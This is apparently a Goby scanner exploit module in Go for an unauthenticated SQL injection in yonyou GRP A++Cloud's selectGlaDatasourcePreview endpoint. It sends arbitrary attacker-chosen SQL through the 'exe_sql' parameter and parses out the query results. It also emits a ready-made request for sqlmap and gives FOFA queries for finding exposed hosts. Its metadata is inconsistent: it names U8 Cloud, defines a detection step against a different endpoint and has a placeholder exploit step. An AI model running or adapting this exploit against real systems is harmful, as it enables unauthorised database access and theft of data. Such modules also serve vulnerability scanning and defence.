package exploits

import (
	"errors"
	"regexp"
	"strings"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /selectGlaDatasourcePreview SQL Injection Vulnerability",
    "Description": "<p>UFIDA U8 Cloud is UFIDA's digital platform for enterprises to go to the cloud, providing comprehensive cloud ERP solutions for growing and innovative companies. However, a security vulnerability exists in the platform involving the lack of effective filtering of user input parameters by the linkntb interface, which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.</p>",
    "Product": "yonyou GRP A++Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-07-26",
    "PostTime": "2024-07-30",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"/pf/portal/login/css/fonts/style.css\" && body=\"/pf/portal/login/css/login.css\"",
    "GobyQuery": "body=\"/pf/portal/login/css/fonts/style.css\" && body=\"/pf/portal/login/css/login.css\"",
    "Level": "2",
    "Impact": "<p>which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select * FROM v$version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/yer/html/nodes/linkntb/linkntb.jsp?pageId=linkntb&billId=1%27)%20and%201=@@version--",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SQL Server",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/yer/html/nodes/linkntb/linkntb.jsp",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/yer/html/nodes/linkntb/linkntb.jsp"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "用友GRP A++Cloud 政府财务云 /selectGlaDatasourcePreview SQL 注入漏洞",
            "Product": "用友GRP A++Cloud",
            "Description": "<p>用友GRP A++Cloud 政府财务云报销产品是在新一代财务平台上的业务管理系统， 依托系统门户、 权限管理等公共资源， 报销管理围绕财务审核流程， 完成借款单填写、 报销单填写、 还款单填写、 预算控制、 财务审核、 自动生成记账凭证。通过报销系统可实现借款报销还款和业务审批不受任何时间、 地点的限制， 同时将费用支出与预算管理子系统关联， 实现实时预算控制。其接口selectGlaDatasourcePreview存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过此漏洞未经授权地访问数据库，造成潜在的信息泄露风险。建议尽快修复漏洞，强化输入验证，提升系统安全性。 在实战中的作用：可以获取数据库敏感信息<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /selectGlaDatasourcePreview SQL Injection Vulnerability",
            "Product": "yonyou GRP A++Cloud",
            "Description": "<p>UFIDA U8 Cloud is UFIDA's digital platform for enterprises to go to the cloud, providing comprehensive cloud ERP solutions for growing and innovative companies. However, a security vulnerability exists in the platform involving the lack of effective filtering of user input parameters by the linkntb interface, which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>which could lead to SQL injection attacks. An attacker can gain unauthorised access to the database through this vulnerability, resulting in a potential risk of information leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10980"
}`

	sendInitialPayload_Hty11U := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		url := `/gla/dataSource/selectGlaDatasourcePreview`
		body := "exe_sql=" + sql + "&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1"
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
			"Content-Type": "application/x-www-form-urlencoded",
			"Connection":   "close",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendInitialPayload_Hty11U
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			// sql := "CHAR(113,112,106,113,113)"
			sql := "select+*+FROM+v$version"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			//检测逻辑
			// re := regexp.MustCompile(`"([^"]+)":\[\{"date":`)
			// // 查找第一个匹配项
			// match := re.FindStringSubmatch(resp.Utf8Html)
			// // 如果找到了匹配项，返回第一个捕获组的内容
			// if len(match) < 1 {
			// 	return false
			// }
			if !strings.Contains(resp.Utf8Html, "list") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/gla/dataSource/selectGlaDatasourcePreview`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendInitialPayload_Hty11U
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams 检查前面是否设置相关参数
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 查找第一个匹配项
				re := regexp.MustCompile(`"list":\[(.*?)\]`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}

				result := strings.Split(re.FindStringSubmatch(resp.Utf8Html)[1], ",")
				value := ""
				key := ""
				for _, v := range result {
					result1 := strings.Trim(strings.Trim(v, "}"), "{")
					result = strings.Split(result1, ":")
					key = strings.Trim(result[0], "\"")
					value += strings.Trim(result[1], "\"") + "\n"
				}

				expResult.Success = true
				// expResult.Output = `The key points you need to extract is : ` + value
				expResult.Output = key+" :\n\n" + value
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用
				expResult.Success = true
				expResult.Output = `POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

exe_sql=select+*+FROM+v$version&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
`
				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
